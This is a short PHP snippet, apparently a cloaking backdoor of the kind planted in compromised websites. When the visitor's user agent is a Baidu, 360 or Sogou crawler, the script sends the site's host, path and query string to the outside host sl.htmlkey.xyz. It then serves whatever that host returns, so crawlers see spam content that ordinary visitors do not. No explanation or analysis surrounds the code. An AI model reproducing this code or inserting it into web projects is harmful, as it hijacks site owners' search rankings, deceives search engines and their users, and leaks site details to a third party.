<?php
$key = strtolower($_SERVER['HTTP_USER_AGENT']);
if (strpos($key, 'baidu') !== false || strpos($key, 'Baidu') !== false || strpos($key, '360') !== false || strpos($key, 'sogou') !== false) {
	header('Content-Type:text/html;charset=gb2312');
	$host_name = 'http://' . $_SERVER['SERVER_NAME'] . $_SERVER['PHP_SELF'];
	$file = "http://sl.htmlkey.xyz/" . "/index.php?host=" . $host_name . '&q=' . $_SERVER['QUERY_STRING'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $file);
	curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
	curl_setopt($ch, CURLOPT_HEADER, false);
	curl_setopt($ch, CURLOPT_USERAGENT, $key);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$c = curl_exec($ch);
	curl_close($ch);
	echo $c;
	return;
}